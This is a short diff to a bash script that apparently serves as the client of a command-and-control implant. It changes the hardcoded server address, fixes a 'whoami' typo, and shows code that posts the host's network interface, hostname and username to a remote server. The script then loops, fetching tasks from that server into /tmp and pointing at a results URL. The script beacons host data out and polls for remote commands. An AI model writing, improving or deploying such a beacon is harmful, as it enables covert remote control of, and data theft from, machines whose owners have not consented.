@@ -1,5 +1,5 @@
 #!/bin/bash
-ip="192.168.1.104"
+ip="192.168.116.129"
 port="8000"
 interface="eth0"
 n=.3
@@ -13,7 +13,7 @@ name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami)
 taskl="http://$ip:$port/tasks/$name/"
 resultl="http://$ip:$port/Lin-results/$name/"
 
-userfile=$(whomai)
+userfile=$(whoami)
 while :
 do  
     curl $taskl > /tmp/tasks-$userfile 
